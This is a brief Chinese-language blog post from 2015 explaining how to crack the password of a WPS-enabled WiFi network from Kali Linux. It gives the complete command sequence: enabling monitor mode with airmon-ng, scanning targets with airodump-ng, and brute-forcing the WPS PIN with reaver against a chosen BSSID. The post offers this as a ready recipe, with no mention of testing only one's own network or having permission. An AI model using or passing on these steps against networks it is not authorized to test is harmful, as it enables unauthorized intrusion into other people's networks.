如何爆破一个WiFi密码

Sep 7, 2015

前一段时间给电脑装了 Kali-Linux，转念一想，这不是能破 WiFi 吗，于是我就实机测试了一下.
注:只支持开放WPS的Wifi

首先进入kali的环境，这里我们假设你已经明白基础 shell 操作.

首先使用 ifconfig 查看你的网卡名字，没有列出的话输入ifconfig -a

这里我们假设他是 wlan0

获取管理员权限sudo -s之后我们输入

airmon-ng start wlan0
`</pre>

他会创建一个监听的 interface 叫做mon0（实际上是mon+数字）

输入 airodump-ng mon0 来扫描，这里要记住你要破解的WiFi的信息。

打开 shell，输入

<pre>`reaver -i mon0 -b 你扫到的BSSID -vv 

好了，大功告成，喝杯水等待吧。
